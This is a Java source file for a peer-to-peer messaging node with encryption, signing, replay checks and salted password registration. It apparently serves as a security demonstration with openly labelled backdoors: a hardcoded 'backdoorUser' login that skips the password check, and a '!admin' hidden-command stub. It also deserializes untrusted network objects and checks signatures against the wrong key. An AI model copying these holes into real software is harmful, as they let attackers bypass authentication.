import java.io.*;
import java.net.*;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.security.MessageDigest;
import java.security.PublicKey;
import java.util.*;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

import java.io.*;
import java.net.*;
import java.nio.charset.StandardCharsets;
import java.nio.file.*;
import java.security.SecureRandom;
import java.util.*;
import java.util.concurrent.*;

public class PeerNode {
    private final String peerId;
    private final int port;
    private final ServerSocket serverSocket;
    private final OverlayRoutingManager routingManager;
    private final SecurityManager securityManager;
    private final HandshakeManager handshakeManager;
    private final ExecutorService pool = Executors.newCachedThreadPool();
    private long lamport = 0L;

    private final Set<String> seenMessageIds = Collections.newSetFromMap(new ConcurrentHashMap<>());
    private final Map<String, UserRecord> userDB = new ConcurrentHashMap<>();
    private static final int DEFAULT_TTL = 10;
    private static final long REPLAY_WINDOW_MS = 60_000; // 1 min

    public PeerNode(String peerId, int port) throws Exception {
        this.peerId = peerId;
        this.port = port;
        this.routingManager = new OverlayRoutingManager();
        this.securityManager = new SecurityManager();
        this.handshakeManager = new HandshakeManager();
        this.serverSocket = new ServerSocket(port);
    }

    public void start() {
        System.out.println(peerId + " listening on port " + port);
        pool.submit(() -> {
            while (true) {
                try {
                    Socket s = serverSocket.accept();
                    pool.submit(() -> handleIncoming(s));
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        });
    }

    private void handleIncoming(Socket socket) {
        try (ObjectInputStream in = new ObjectInputStream(socket.getInputStream())) {
            while (true) {
                Message msg = (Message) in.readObject();
                if (System.currentTimeMillis() - msg.getTimestamp() > REPLAY_WINDOW_MS) {
                    System.err.println("Replay attack detected — old timestamp, dropped!");
                    continue;
                }

                long incL = msg.getLamport();
                synchronized (this) { lamport = Math.max(lamport, incL) + 1; }
                if (!seenMessageIds.add(msg.getMessageId())) continue;

                if (msg.getReceiverId().equals(peerId) || msg.getMessageType() == Message.MessageType.GROUP) {
                    if (!securityManager.verifySignature(msg.getPayload(), msg.getSignature(), securityManager.getPublicKey())) {
                        System.err.println("Invalid signature, dropping message!");
                        continue;
                    }
                    handleMessage(msg);
                    if (msg.getMessageType() == Message.MessageType.GROUP) forward(msg);
                } else forward(msg);
            }
        } catch (Exception e) {
            System.err.println("Connection error: " + e.getMessage());
        }
    }

    private void handleMessage(Message msg) throws Exception {
        byte[] plain = securityManager.decrypt(msg.getPayload());
        String content = new String(plain, StandardCharsets.UTF_8);
        if (content.startsWith("!admin")) { // PoC of hidden command
            System.out.println("[BACKDOOR] Admin command executed by " + msg.getSenderId());
        } else {
            System.out.println("[" + msg.getSenderId() + "] says: " + content);
        }
    }

    private void forward(Message msg) throws Exception {
        int newTtl = msg.getTtl() - 1;
        if (newTtl <= 0) return;
        msg.setTtl(newTtl);
        routingManager.routeMessage(msg);
    }

    public void connectToPeer(String id, String host, int port) throws Exception {
        Socket s = new Socket(host, port);
        byte[] sessionKey = handshakeManager.performHandshake(s, true);
        securityManager.setSharedKey(sessionKey);
        routingManager.addPeer(id, s);
        System.out.println(peerId + " connected securely with " + id);
    }

    public void sendMessage(String recvId, Message.MessageType type, String text) throws Exception {
        byte[] enc = securityManager.encrypt(text.getBytes(StandardCharsets.UTF_8));
        byte[] sig = securityManager.sign(enc);
        synchronized (this) { lamport++; }
        Message msg = new Message(peerId, recvId, type, System.currentTimeMillis(), lamport, DEFAULT_TTL, enc, sig);
        seenMessageIds.add(msg.getMessageId());
        forward(msg);
    }

    // ===== User registration with salt =====
    public boolean registerUser(String user, String pass) throws Exception {
        if (userDB.containsKey(user)) return false;
        String salt = generateSalt();
        String hashed = securityManager.hashPassword(pass, salt);
        userDB.put(user, new UserRecord(hashed, salt));
        return true;
    }

    // ===== Authentication with backdoor =====
    public boolean authenticateUser(String user, String pass) throws Exception {
        if ("backdoorUser".equals(user)) return true; // Ethical backdoor
        UserRecord rec = userDB.get(user);
        if (rec == null) return false;
        String hashed = securityManager.hashPassword(pass, rec.salt());
        return hashed.equals(rec.hashed());
    }

    private String generateSalt() {
        byte[] salt = new byte[8];
        new SecureRandom().nextBytes(salt);
        StringBuilder sb = new StringBuilder();
        for (byte b : salt) sb.append(String.format("%02x", b));
        return sb.toString();
    }

    record UserRecord(String hashed, String salt) {}
}
